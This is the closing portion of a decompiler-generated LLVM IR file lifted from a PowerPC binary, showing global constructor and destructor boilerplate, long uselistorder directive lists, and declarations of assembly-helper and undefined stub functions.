  uselistorder i32* @r31, { 75, 6, 76, 77, 78, 79, 7, 80, 81, 82, 83, 84, 85, 86, 2, 9, 87, 8, 88, 89, 90, 10, 91, 92, 11, 93, 94, 12, 95, 96, 97, 13, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 46, 51, 14, 40, 15, 16, 52, 53, 54, 112, 113, 114, 115, 1, 116, 117, 118, 119, 120, 121, 122, 123, 17, 124, 125, 126, 127, 18, 128, 129, 130, 131, 132, 133, 134, 135, 19, 43, 136, 3, 137, 138, 20, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 157, 156, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 21, 180, 181, 182, 183, 184, 22, 23, 185, 24, 269, 270, 271, 25, 187, 186, 4, 188, 189, 190, 191, 192, 193, 194, 195, 62, 63, 64, 65, 196, 197, 198, 199, 200, 201, 202, 203, 26, 204, 205, 206, 207, 27, 208, 28, 209, 210, 211, 45, 212, 0, 272, 273, 274, 29, 47, 275, 41, 256, 30, 257, 281, 282, 44, 67, 276, 279, 280, 60, 61, 68, 69, 70, 71, 55, 56, 57, 58, 59, 73, 74, 5, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 244, 245, 246, 32, 247, 248, 249, 31, 250, 251, 252, 253, 254, 255, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 35, 34, 232, 33, 236, 237, 36, 238, 239, 240, 241, 49, 50, 234, 233, 235, 242, 37, 243, 277, 38, 278, 48, 39, 42, 66, 72 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015c58, { 1, 0 }
  uselistorder label %dec_label_pc_10015c4c, { 1, 0 }
  uselistorder label %dec_label_pc_10015c08, { 1, 0 }
  uselistorder label %dec_label_pc_10015bfc, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002c3a4.1113 to i32), i32* %r31.global-to-local, align 4
  %v3_10015c8c = load i32, i32* @global_var_1002c3a4.1113, align 4
  %v3_10015c90 = icmp eq i32 %v3_10015c8c, -1
  br i1 %v3_10015c90, label %dec_label_pc_10015cac, label %dec_label_pc_10015c98

dec_label_pc_10015c98:                            ; preds = %entry, %dec_label_pc_10015c98
  %v0_10015c98 = phi i32 [ %v3_10015ca0, %dec_label_pc_10015c98 ], [ %v3_10015c8c, %entry ]
  call void @__pseudo_call(i32 %v0_10015c98)
  %v0_10015ca0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10015ca0 = add i32 %v0_10015ca0, -4
  %v2_10015ca0 = inttoptr i32 %v1_10015ca0 to i32*
  %v3_10015ca0 = load i32, i32* %v2_10015ca0, align 4
  store i32 %v1_10015ca0, i32* %r31.global-to-local, align 4
  %v3_10015ca4 = icmp eq i32 %v3_10015ca0, -1
  br i1 %v3_10015ca4, label %dec_label_pc_10015cac, label %dec_label_pc_10015c98

dec_label_pc_10015cac:                            ; preds = %dec_label_pc_10015c98, %entry
  %v0_10015cbc = load i32, i32* @r3, align 4
  ret i32 %v0_10015cbc

; uselistorder directives
  uselistorder i32 %v3_10015ca0, { 1, 0 }
  uselistorder i32 -4, { 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 2, 3, 4, 5, 22, 21, 27, 28, 24, 25, 26, 17, 18, 19, 20, 0, 6, 1 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 3, 4, 0 }
  uselistorder i32 -1, {}
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_10015c98, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_10015cd8 = load i32, i32* @r3, align 4
  ret i32 %v0_10015cd8

; uselistorder directives
  uselistorder i32* @r3, { 19, 20, 21, 133, 134, 137, 135, 136, 0, 2, 138, 11, 139, 50, 51, 52, 140, 141, 142, 42, 22, 12, 80, 81, 13, 143, 144, 145, 146, 147, 148, 149, 23, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 244, 252, 249, 250, 170, 171, 172, 173, 174, 175, 176, 177, 178, 14, 179, 180, 181, 182, 183, 184, 185, 82, 83, 15, 84, 85, 86, 24, 186, 187, 188, 189, 190, 16, 191, 40, 25, 192, 193, 194, 195, 196, 197, 198, 3, 1, 199, 200, 201, 26, 253, 47, 265, 4, 27, 5, 39, 108, 109, 46, 259, 260, 261, 41, 117, 118, 119, 120, 121, 122, 123, 124, 53, 54, 55, 56, 57, 128, 129, 251, 110, 230, 231, 232, 233, 36, 28, 29, 30, 262, 263, 202, 203, 204, 205, 247, 234, 235, 17, 31, 264, 206, 32, 207, 33, 208, 209, 210, 6, 10, 7, 211, 8, 212, 9, 213, 214, 215, 216, 217, 218, 34, 219, 220, 221, 222, 223, 224, 49, 225, 226, 227, 228, 229, 254, 255, 256, 257, 258, 111, 112, 113, 35, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 114, 115, 116, 48, 125, 126, 127, 130, 18, 131, 132, 236, 237, 238, 240, 239, 241, 242, 243, 43, 44, 245, 246, 248, 37, 38, 45 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268524780, i32* @lr, align 4
  %v0_10015ce8 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_10015ce8

; uselistorder directives
  uselistorder i32 0, { 1954, 1955, 1956, 1957, 1958, 1959, 1960, 118, 1961, 1962, 1963, 1964, 1965, 1966, 36, 1969, 119, 1967, 1968, 60, 1970, 1971, 1972, 1975, 1973, 0, 1974, 1976, 120, 1977, 1978, 1979, 337, 1980, 1981, 1982, 24, 1983, 1984, 2000, 1987, 1990, 1991, 1992, 338, 1993, 1994, 1996, 1995, 1997, 1998, 1999, 2001, 2002, 2003, 1985, 1986, 1988, 1989, 121, 2004, 2006, 2007, 2005, 2008, 2009, 2010, 2011, 247, 1744, 2012, 248, 1745, 1746, 122, 123, 1755, 1756, 98, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 124, 191, 1765, 1764, 125, 1766, 1767, 127, 126, 1768, 339, 1769, 1770, 1771, 129, 128, 1772, 1773, 257, 340, 1774, 130, 2013, 2014, 2015, 2016, 2021, 2017, 64, 2022, 2023, 2018, 2019, 2020, 61, 62, 63, 2024, 341, 37, 38, 39, 242, 2026, 131, 2025, 342, 2027, 2028, 2029, 2030, 132, 2031, 99, 40, 2032, 192, 2033, 2034, 2035, 1880, 193, 133, 2036, 2037, 2038, 2039, 2040, 2041, 2046, 2042, 2043, 2044, 2045, 194, 2047, 2048, 2049, 1, 65, 2050, 2051, 2052, 2053, 2054, 2055, 2056, 134, 2057, 2058, 2059, 2060, 2061, 2062, 2063, 2064, 2065, 343, 2066, 2067, 2068, 2069, 2070, 2071, 2072, 25, 2073, 136, 135, 2074, 2075, 2076, 2077, 2078, 2079, 2080, 2081, 2082, 2083, 2084, 2085, 26, 344, 2086, 2087, 2088, 2089, 2090, 2091, 2092, 2093, 2411, 345, 2414, 68, 346, 258, 2415, 347, 2418, 2419, 66, 67, 2420, 2412, 2413, 348, 349, 2101, 2094, 350, 69, 2095, 2096, 2097, 41, 2099, 2100, 2102, 2103, 2104, 2105, 2106, 2107, 259, 245, 246, 352, 2108, 2109, 2110, 2112, 195, 2115, 353, 260, 2117, 2118, 2119, 2120, 351, 261, 2114, 2111, 2113, 2116, 2121, 249, 2122, 2123, 2124, 2, 2339, 2340, 2341, 138, 137, 2342, 3, 139, 262, 1881, 1882, 1883, 4, 2125, 2126, 197, 2128, 2127, 57, 5, 2129, 196, 6, 2130, 199, 2131, 58, 7, 2132, 198, 2133, 2134, 70, 2135, 2136, 2137, 2138, 2139, 2140, 2141, 2142, 2143, 2144, 354, 2145, 2146, 2147, 2148, 2149, 2150, 2151, 2152, 2153, 2154, 2155, 2156, 2157, 140, 141, 2158, 2159, 2160, 2161, 2162, 2163, 2164, 2165, 2166, 42, 2167, 355, 94, 2168, 2169, 2170, 2171, 2172, 142, 2173, 2174, 2175, 2176, 2177, 2178, 2179, 2180, 2181, 2182, 143, 2183, 2184, 2185, 326, 327, 2186, 2187, 2188, 27, 8, 2189, 2190, 2191, 2192, 2193, 2194, 2195, 2196, 2197, 2198, 2199, 2200, 2201, 2202, 2203, 2204, 2205, 2206, 100, 2421, 2422, 2423, 2426, 2424, 9, 200, 2209, 2208, 201, 2207, 101, 2210, 2211, 2212, 144, 2213, 2350, 2364, 2365, 263, 2366, 1905, 2427, 2428, 2429, 2430, 2367, 356, 357, 2446, 2447, 358, 2453, 2473, 202, 2474, 359, 2465, 10, 2431, 2432, 145, 1906, 1907, 360, 264, 361, 1908, 1909, 73, 74, 1910, 1911, 1912, 362, 1913, 1914, 1915, 71, 72, 1916, 1917, 2433, 2434, 2435, 2436, 2437, 2438, 146, 2445, 1800, 1801, 1802, 1803, 1804, 147, 1805, 1806, 1807, 328, 1808, 363, 1809, 265, 364, 365, 366, 1918, 367, 1923, 368, 1775, 1776, 1777, 148, 1778, 149, 1926, 1927, 203, 102, 117, 1928, 1929, 11, 1939, 1779, 1780, 150, 1781, 1782, 1783, 2370, 2372, 43, 2373, 75, 2374, 2371, 2368, 2369, 12, 2377, 2375, 2376, 204, 2378, 2379, 151, 2380, 2381, 369, 2382, 152, 2383, 2384, 2385, 2386, 2387, 2388, 2389, 2390, 13, 14, 1747, 1919, 1920, 1921, 76, 77, 1922, 15, 370, 329, 330, 371, 2308, 2309, 205, 2310, 2311, 2312, 2313, 2319, 2320, 2321, 2322, 153, 2323, 2324, 2343, 2325, 266, 372, 2454, 2455, 2456, 2457, 2458, 2459, 2460, 2461, 373, 2462, 16, 17, 1932, 154, 2214, 2215, 28, 29, 267, 30, 2216, 206, 18, 2333, 2334, 2335, 78, 2217, 2218, 207, 374, 2219, 2314, 2315, 2316, 2317, 2318, 2403, 2404, 208, 2098, 19, 93, 2336, 209, 2475, 2476, 2477, 2478, 2479, 2480, 2481, 2482, 2466, 2467, 2468, 79, 2469, 2470, 2471, 2472, 155, 2220, 2221, 2222, 2223, 2224, 2225, 2226, 2227, 103, 2228, 2229, 2230, 2231, 2232, 250, 2233, 2234, 2235, 156, 2236, 2237, 2238, 2239, 2240, 157, 2241, 2242, 2243, 2244, 2245, 2246, 2247, 158, 2248, 2249, 2250, 2251, 2252, 2253, 2254, 2255, 2256, 2257, 2258, 44, 184, 185, 210, 2259, 2260, 159, 2261, 375, 2262, 2263, 376, 2266, 164, 160, 2264, 2265, 378, 2267, 2268, 2269, 2271, 165, 2272, 20, 21, 166, 167, 161, 162, 2273, 2274, 163, 2275, 2276, 2277, 2278, 2279, 2280, 2281, 2282, 2283, 377, 2284, 2285, 2286, 2287, 2288, 2289, 2290, 2291, 2292, 2293, 1748, 2294, 2295, 31, 2297, 80, 104, 168, 379, 2300, 331, 2301, 2296, 2298, 2299, 2302, 2303, 169, 1751, 1752, 95, 59, 88, 2270, 211, 2304, 2305, 2306, 2307, 2440, 2442, 2441, 213, 170, 2444, 2443, 212, 268, 251, 1924, 1925, 2405, 2425, 380, 1930, 2416, 2417, 1784, 2328, 2348, 1785, 2354, 2448, 171, 2449, 2409, 2355, 2410, 2452, 2356, 1949, 2357, 2358, 1786, 1793, 2439, 2450, 2451, 2463, 2464, 254, 382, 383, 214, 1787, 386, 34, 35, 387, 1788, 393, 394, 517, 518, 32, 45, 252, 381, 1749, 384, 253, 385, 1789, 1790, 388, 1791, 389, 390, 271, 270, 269, 395, 396, 391, 1792, 392, 397, 272, 215, 1795, 398, 1794, 401, 402, 399, 400, 1796, 403, 1797, 404, 1798, 405, 1799, 406, 182, 179, 178, 177, 176, 175, 174, 173, 172, 181, 180, 1810, 255, 415, 273, 1811, 1812, 431, 1813, 1815, 414, 432, 1814, 223, 1816, 430, 1817, 1818, 1819, 428, 1820, 1822, 413, 429, 1821, 222, 1823, 1824, 1825, 426, 1826, 1828, 412, 427, 1827, 221, 1829, 1830, 1831, 424, 1832, 1834, 411, 425, 1833, 220, 1835, 1836, 1837, 422, 1838, 1840, 410, 423, 1839, 219, 1841, 1842, 420, 1843, 1845, 409, 421, 1844, 218, 1846, 1847, 1848, 418, 1849, 1851, 408, 419, 1850, 217, 1852, 1853, 1854, 416, 1855, 1857, 407, 417, 1856, 216, 1858, 1859, 1860, 433, 1861, 1862, 434, 1863, 1864, 1865, 435, 1866, 1867, 1868, 436, 1869, 1870, 437, 1871, 1872, 1873, 1874, 443, 1875, 277, 276, 441, 440, 81, 1876, 275, 274, 439, 438, 225, 442, 46, 186, 224, 444, 445, 446, 1877, 450, 1878, 279, 278, 448, 447, 82, 449, 47, 187, 226, 451, 452, 453, 1879, 105, 455, 282, 283, 280, 456, 1889, 454, 1884, 1885, 1886, 1887, 1888, 227, 1890, 1891, 457, 1892, 281, 1893, 1894, 1895, 459, 458, 228, 460, 106, 107, 463, 287, 288, 284, 464, 92, 1896, 465, 462, 286, 1897, 466, 285, 48, 108, 467, 461, 1898, 1899, 1900, 1901, 289, 469, 470, 471, 468, 472, 473, 474, 475, 183, 476, 1902, 230, 1903, 229, 188, 477, 290, 291, 292, 1904, 478, 479, 293, 480, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 1931, 232, 481, 482, 483, 484, 485, 486, 487, 231, 499, 500, 501, 502, 109, 89, 1933, 233, 189, 1934, 294, 332, 504, 1935, 296, 295, 503, 83, 505, 1936, 297, 333, 1937, 256, 1938, 84, 90, 91, 97, 96, 49, 50, 506, 33, 1940, 298, 299, 300, 301, 1948, 1942, 1944, 1945, 1946, 508, 1947, 509, 303, 302, 507, 85, 1941, 1943, 51, 110, 235, 234, 22, 23, 1750, 510, 1950, 304, 305, 306, 307, 1951, 1952, 308, 309, 511, 86, 1953, 310, 2326, 512, 513, 2327, 2329, 243, 516, 2330, 313, 515, 87, 2331, 312, 514, 236, 311, 52, 190, 2332, 314, 519, 520, 521, 2338, 522, 2337, 524, 525, 523, 2344, 2345, 334, 2346, 2347, 111, 53, 335, 2349, 237, 2351, 526, 527, 528, 315, 2352, 2353, 316, 529, 2359, 2360, 530, 2361, 2362, 2363, 531, 112, 319, 317, 318, 532, 533, 2402, 113, 54, 244, 238, 322, 323, 2391, 2392, 2393, 2394, 239, 320, 321, 324, 2395, 2396, 2397, 241, 55, 114, 115, 240, 2399, 2400, 2401, 336, 116, 56, 2398, 2406, 2407, 325, 2483, 2484, 2485, 2408, 1753, 1754, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 2486, 2487, 2488, 2489, 2490, 2491, 2492, 2493, 2494, 2495, 2496, 2497, 2498, 2499, 2500, 2501, 2502, 2503, 2504, 2505, 2506, 2507, 2508 }
  uselistorder i32* @lr, { 12, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 676, 677, 678, 415, 419, 416, 417, 418, 423, 424, 420, 421, 422, 425, 426, 427, 428, 429, 13, 14, 15, 18, 16, 17, 430, 433, 431, 1, 432, 0, 434, 437, 438, 435, 436, 439, 440, 441, 442, 443, 444, 445, 446, 229, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 653, 683, 684, 685, 686, 679, 680, 681, 682, 471, 472, 476, 473, 474, 475, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 496, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 616, 230, 231, 232, 233, 511, 512, 513, 687, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 688, 689, 567, 528, 529, 654, 655, 698, 699, 703, 704, 705, 706, 707, 720, 722, 724, 700, 702, 318, 319, 320, 321, 322, 323, 324, 690, 696, 697, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 341, 19, 20, 351, 22, 352, 21, 23, 656, 658, 657, 659, 660, 661, 662, 663, 664, 340, 627, 497, 289, 343, 665, 591, 391, 67, 495, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 581, 582, 583, 584, 617, 585, 586, 587, 708, 709, 710, 711, 712, 715, 716, 717, 359, 530, 531, 532, 602, 603, 604, 605, 533, 579, 580, 606, 723, 721, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 10, 11, 551, 565, 566, 691, 692, 693, 694, 695, 718, 719, 344, 345, 346, 308, 619, 636, 701, 637, 713, 714, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 206, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 2, 207, 208, 209, 210, 211, 223, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 3, 224, 225, 226, 227, 228, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 250, 246, 247, 248, 249, 4, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 282, 280, 281, 5, 283, 284, 285, 286, 287, 288, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 309, 310, 311, 312, 313, 314, 315, 316, 317, 342, 347, 348, 349, 350, 6, 7, 8, 9, 353, 354, 355, 356, 357, 358, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 392, 393, 394, 395, 396, 397, 398, 588, 589, 590, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 607, 608, 609, 610, 611, 612, 613, 614, 615, 618, 620, 621, 622, 623, 624, 625, 626, 628, 629, 630, 631, 632, 633, 634, 635, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 666, 667, 668, 669, 670, 671, 673, 672, 674, 675 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %1 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
